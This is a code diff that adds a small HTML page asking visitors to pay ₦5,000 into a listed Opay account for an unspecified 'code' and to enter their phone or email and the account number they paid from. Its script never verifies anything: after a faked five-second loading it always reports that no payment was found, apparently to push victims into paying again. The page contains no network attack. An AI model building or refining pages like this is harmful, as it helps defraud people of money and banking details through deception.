@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Confirmation</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1><u>Code purchasing</u> </h1>
+        <p><strong>kindly send the sum of  ₦5,000 to our following Opay account below for your code:</strong></p>
+        <p><strong>Account Number:</strong> 9073640019</p>
+        <p><strong>Enter your phone number or email to receive the code:</strong></p>
+        <form id="paymentForm">
+          
+            <input type="text" id="contactInfo" placeholder="Phone number or Email" required>
+          <p><strong>Enter your account number you use to make payment</strong></p>
+            <input type="text" id="contactInfo" placeholder="Your account number" required>
+            <button type="submit" id="paymentButton">Payment Made</button>
+        </form>
+        <div id="loading" class="hidden"></div>
+    </div>
+
+    <script>
+        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var contactInfo = document.getElementById('contactInfo').value;
+            
+            // Simulate loading for 5 seconds
+            document.getElementById('paymentButton').disabled = true;
+            document.getElementById('loading').classList.remove('hidden');
+            setTimeout(() => {
+                document.getElementById('paymentButton').disabled = false;
+                document.getElementById('loading').classList.add('hidden');
+                alert("No payment was found on our system. Please ensure your payment was completed and try again or refresh this page and try again letter.");
+            }, 5000);
+        });
+    </script>
+</body>
+</html>
